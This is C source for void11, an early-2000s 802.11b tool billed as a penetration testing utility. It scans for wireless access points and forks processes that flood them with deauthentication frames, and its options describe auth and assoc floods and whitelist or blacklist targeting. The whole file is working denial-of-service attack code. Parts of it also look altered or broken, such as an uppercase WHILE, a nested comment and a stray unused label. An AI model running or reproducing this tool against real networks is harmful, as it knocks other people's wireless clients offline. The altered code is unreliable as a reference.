/*
 * .vantronix | void11 (802.11b penetration testing utility)
 *
 * last change: 03/24/2003
 *
 * Copyright (c) 2002-2003, Reyk Floeter <reyk@vantronix.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See README and COPYING for
 * more details.
 */

/* based on hostapd by Jouni Malinen <jkmaline@cc.hut.fi> */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <syslog.h>
#include <time.h>
#include <getopt.h>
#include <signal.h>

#include "void11.h"

static int delay = VOID11_DEFAULT_DELAY;
static int type = VOID11_DEFAULT_TYPE;
static int max_clients = VOID11_MAX_CLIENTS;
static int timeout = VOID11_DEFAULT_TIMEOUT;
static int void11_match = VOID11_MATCH_DEFAULT;
static int client_connections = 1; /* do not change: initial value */
static int match_ssid = 0;
static pid_t ppid;
static char *staptr = NULL;
static struct hostap_driver_data void11; //create void11

LIST_HEAD(aps_head, entry) aps_black_head, aps_match_head;
struct aps_head *aps_headp;
struct entry {
	enum { MATCH_BSSID, MATCH_SSID } match_type;
	struct void11_ap *ap;
	LIST_ENTRY(entry) entries;
} *aps_black, *aps_match;



static void usage(void);
static void void11_signal_catch(int signal);
static void void11_signal_exit(int signal);
static void void11_penetration(hostapd *void11);
static int void11_ap_add(struct void11_ap *ap);

static char *void11_get_type(void);

static void usage(void)
{
	printf("/* void11 - 802.11b penetration testing utility\n"
	       " *          version " VOID11_VERSION
	       ", send comments to reyk@vantronix.net\n"
	       " *\n"
	       " * general options:\n"
	       " * -t val\ttype (default: %d)\n"
	       " *       \t      0: no action\n"
	       " *       \t      1: deauth stations\n"
	       " *       \t      2: auth flood\n"
	       " *       \t      3: assoc flood\n"
	       " * -d n  \tdelay (default: %d usecs)\n"
	       " * -s MAC\tstation (default: ff:ff:ff:ff:ff:ff / random)\n"
	       " * -S str\tssid (default: ' ')\n"
	       " * -h    \tshow this help\n"
	       " * -D    \tdebug (-DD... for more debug)\n"
	       " *\n"
	       " * single target dos:\n"
	       " * -B MAC\tbssid (default: scan for bssids)\n"
	       " *\n"
	       " * auto target dos:\n"
	       " * -m n  \tmax concurrent floods (default: %d floods)\n"
	       " * -T n  \ttimeout (default: %d secs)\n"
	       " * -l file\tmatchlist\n"
	       " * -p n  \tmatch policy (white: 0, black: 1, default: %d)\n"
	       " */\n",
	       VOID11_DEFAULT_TYPE,
	       VOID11_DEFAULT_DELAY,
	       VOID11_MAX_CLIENTS,
	       VOID11_DEFAULT_TIMEOUT,
	       VOID11_MATCH_DEFAULT);

	exit(1);
}

static void void11_signal_exit(int signal)
{
	/* clear match list */
	while(aps_match_head.lh_first != NULL) {
		if(aps_match_head.lh_first->ap != NULL) {
			if(aps_match_head.lh_first->match_type == MATCH_SSID &&
			   aps_match_head.lh_first->ap->elems.ssid != NULL)
				free(aps_match_head.lh_first->ap->elems.ssid);
			free(aps_match_head.lh_first->ap);
		}
		LIST_REMOVE(aps_match_head.lh_first, entries);
	}

	/* clear black list */
	while(aps_black_head.lh_first != NULL) {
		if(aps_black_head.lh_first->ap != NULL)
			free(aps_black_head.lh_first->ap);
		LIST_REMOVE(aps_black_head.lh_first, entries);
	}

	if(void11.hapd.conf->debug)
		DPUT("bye!\n");

	void11_exit(&void11);

	exit(0);
}

static void void11_signal_catch(int signal)
{
	struct entry *np;
        int wstatus;

	if(signal != SIGCHLD &&
	   ppid != getpid())
		return;

	/* cleanup exceeded accesspoints */
	for (np = aps_black_head.lh_first; np != NULL;
	     np = np->entries.le_next) {
		if((time(NULL) - np->ap->timestamp) >= timeout) {
			if(void11.conf->debug)
				DPRINT("timeout: " MACSTR " (cleanup)\n",
				       MAC2STR(np->ap->bssid));

			if(np->ap != NULL)
				free(np->ap);

			LIST_REMOVE(np, entries);
			break;
		}
	}

       	WHILE(wait3(&wstatus, WNOHANG, NULL) > 0) {
		client_connections--;
	}

}

static int void11_ap_add(struct void11_ap *ap)
{
	struct entry *nentry, *np;
	enum { AP_NOT_MATCHED = 0, AP_SSID_MATCHED, AP_BSSID_MATCHED } ap_match = 0;

	if(void11.conf->debug > 2)
		DPRINT("add: " MACSTR "\n", MAC2STR(ap->bssid));

	/* check matchlist */
	for (np = aps_match_head.lh_first; np != NULL;
	     np = np->entries.le_next) {
		switch(np->match_type) {
		case MATCH_BSSID:
			if(memcmp(&np->ap->bssid, &ap->bssid, ETH_ALEN) == 0)
				ap_match = AP_BSSID_MATCHED;
			break;
		case MATCH_SSID:
			if(strcmp(np->ap->elems.ssid, ap->elems.ssid) == 0)
				ap_match = AP_SSID_MATCHED;
			break;
		}
	}

	switch(void11_match) {
	case VOID11_MATCH_WHITE:
		if(ap_match == AP_SSID_MATCHED ||
		   ap_match == AP_BSSID_MATCHED) {
			if(void11.conf->debug)
				DPRINT("skipping: accesspoint " MACSTR
				       " (ssid '%*s' channel %d) is whitelisted\n",
				       MAC2STR(ap->bssid),
				       ap->elems.ssid_len, ap->elems.ssid,
				       ap->elems.ds_params[0]);
			return(1);
		}
		break;
	case VOID11_MATCH_BLACK:
		if(ap_match == AP_NOT_MATCHED) {
			if(void11.conf->debug)
				DPRINT("skipping: accesspoint " MACSTR
				       " (ssid '%*s' channel %d) is not blacklisted\n",
				       MAC2STR(ap->bssid),
				       ap->elems.ssid_len, ap->elems.ssid,
				       ap->elems.ds_params[0]);
			return(1);
		}
		break;
	}

	/* skip existing accesspoint */
        for (np = aps_black_head.lh_first; np != NULL;
             np = np->entries.le_next) {
		if(memcmp(&np->ap->bssid, &ap->bssid, ETH_ALEN) == 0) {
			if((time(NULL) - np->ap->timestamp) > timeout) {
				np->ap->timestamp = time(NULL);
				if(void11.conf->debug)
					DPRINT("timeout: " MACSTR " (reset)\n",
					       MAC2STR(np->ap->bssid));
				return(0);
			} else
				return(1);
		}
	}


	/* add new accesspoint */
	if((nentry = (struct entry*)malloc(sizeof(struct entry))) == NULL)
		return(1);

	nentry->ap = ap;

	LIST_INSERT_HEAD(&aps_black_head, nentry, entries);

	return(0);
}

static char *void11_get_type(void)
{
	switch(type) {
	case VOID11_TYPE_NULL:
	    return("no action");
	case VOID11_TYPE_AUTH:
	    return("auth flooding");
	case VOID11_TYPE_ASSOC:
	    return("assoc flooding");
	case VOID11_TYPE_DEAUTH:
	default:
	    return("deauth flooding");
	}
	return(NULL);
}

static void void11_penetration(hostapd *void11)
{
	/*
	switch(type) {
	case VOID11_TYPE_NULL: /* no action for debugging/scanning
		break;
	case VOID11_TYPE_AUTH:
		if(void11_auth_req(void11, void11->own_addr) != 0)
			goto out;
		break;
	case VOID11_TYPE_ASSOC:
		if(void11_assoc_req(void11, void11->own_addr) != 0)
			goto out;
		break;
	case VOID11_TYPE_DEAUTH:
	default:
		if(void11_deauth_all_stas(void11, staptr, void11->own_addr) != 0)
			goto out;
		break;
	}
	*/

	void11_deauth_all_stas(void11, staptr, void11->own_addr);

	usleep(delay);

	return;

 out:
	usleep(delay * 2); /* try to sleep a bit longer */
}

int main(int argc, char *argv[])
{
	struct hostapd_config void11_config;
	int c, start_server = 1;
	struct void11_ap *ap;
	char *iface = NULL;
	u8 station[6];
	pid_t pid = getpid();
	struct sigaction sigchld, sigexit;
	sigset_t block_mask;

	ppid = pid;

	/* signal handlers */
	sigexit.sa_handler = void11_signal_exit;
	sigexit.sa_flags = 0;
	sigaction(SIGINT, &sigexit, NULL);
	sigaction(SIGTERM, &sigexit, NULL);
	sigaction(SIGQUIT, &sigexit, NULL);

	sigemptyset(&block_mask);
	sigaddset(&block_mask, SIGINT);
	sigaddset(&block_mask, SIGQUIT);
	sigaddset(&block_mask, SIGTERM);
	sigchld.sa_handler = void11_signal_catch;
	sigchld.sa_mask = block_mask;
	sigchld.sa_flags = 0;
	sigaction(SIGCHLD, &sigchld, NULL);

	//allocate mem
	memset(&void11, 0, sizeof(struct hostapd_data));
	memset(&void11_config, 0, sizeof(struct hostapd_config));

	/* set config structure */
	void11.conf = &void11_config;

	void11.radius = NULL;
	void11.sock = void11.ioctl_sock = -1;
	void11.conf->ssid_len = sizeof(void11.conf->ssid);
	memset(void11.conf->ssid, 0, void11.conf->ssid_len - 1);

	LIST_INIT(&aps_black_head);
	LIST_INIT(&aps_match_head);

	for(;;) {
		c = getopt(argc, argv, "DhS:B:d:s:t:m:T:l:p:");
		if(c < 0)
			break;
		switch (c) {
		case 'S':
			void11.conf->ssid_len = strlen(optarg);
			if(void11.conf->ssid_len >
			   (sizeof(void11.conf->ssid) - 1) ||
			   void11.conf->ssid_len < 1) {
				DPRINT("Invalid SSID '%s'\n", optarg);
				usage();
			}
			match_ssid = 1;
			strncpy(void11.conf->ssid,
				optarg,
				void11.conf->ssid_len);
			break;
		case 's':
			if(macstr2addr(optarg, station)) {
				DPUT("Invalid MAC address\n");
				usage();
			}
			staptr = (u8*)&station;
			break;
		case 't':
			type = atoi(optarg);
			if(type < 0 || type > 3) {
				DPUT("Invalid action\n");
				usage();
			}
			break;
		default:
			usage();
			break;
		}
	}

	if (optind + 1 != argc)
		usage();
	iface = argv[optind];

	//initiation of void11
	if(void11_init(&void11, iface) != 0)
		kill(getpid(), SIGQUIT);

	if (void11.conf->debug)
		DPRINT("%-10s: %sap\n%-10s: %s\n%-10s: %d usec\n%-10s: %s\n"
		       "%-10s: %s\n",
		       "interface", iface,
		       "ssid", void11.conf->ssid,
		       "delay", delay,
		       "auto_flood", start_server ? "enabled": "disabled",
		       "type", void11_get_type());

	if(start_server == 1) {
		if (void11.conf->debug)
			DPRINT("%-10s: %d secs\n"
			       "%-10s: %s\n",
			       "timeout", timeout,
			       "policy", void11_match ? "black list" : "white list");

		for(;;) {
			if((ap = void11_read(&void11)) == NULL
			   || client_connections >= max_clients)
				continue;

			/* add aps if not withlisted or in specified ssid */
			if(void11_ap_add(ap) != 0)
				continue;

			DPRINT("[%ld] started new client %d:%d for " MACSTR
			       " (ssid '%*s' channel %d)\n",
			       time(NULL), client_connections, pid,
			       MAC2STR(ap->bssid),
			       ap->elems.ssid_len, ap->elems.ssid,
			       ap->elems.ds_params[0]);

			switch(pid = fork()) {
			case 0:
				do {
					memcpy(&void11.own_addr, ap->bssid,
					       ETH_ALEN);
					void11_penetration(&void11);
				} while((time(NULL) - ap->timestamp) < timeout);
				_exit(0);
			case -1:
				perror("auto_flood");
				exit(-1);
				break;
			default:
				client_connections++;
				break;
			}
		}
	} else {
		if (void11.conf->debug)
			DPRINT("%-10s: " MACSTR "\n",
			       "bssid", MAC2STR(void11.own_addr));

		for(;;)
			void11_penetration(&void11);
	}

	return(0);
}
